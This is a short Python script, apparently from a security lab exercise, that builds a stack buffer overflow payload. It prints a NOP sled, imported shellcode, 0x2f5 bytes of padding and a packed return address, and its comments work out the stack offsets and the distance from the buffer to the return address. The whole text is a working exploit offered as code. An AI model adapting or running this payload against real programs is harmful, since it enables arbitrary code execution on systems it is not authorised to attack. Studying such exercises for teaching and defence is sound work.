from shellcode import shellcode
from struct import pack
# stack offset range: 0x10 ~ 0x110
# starting address of buf range: 0xbffe9890 ~ 0xbffe9790
# return address of vulnerable range: 0xbffe9c9c ~ 0xbffe9b9c
# distance from buf head to ret addr: always 0x40c
# number of nop: 0x100
# distance from shellcode to ret addr: always 0x30c
# length of shellcode: 23 bytes
# number of placehoder 'a': 0x30c - 0x17 = 0x2f5
print "\x90" * 0x100 + shellcode + "a" * 0x2f5 + pack("<I", 0xbffe9890)
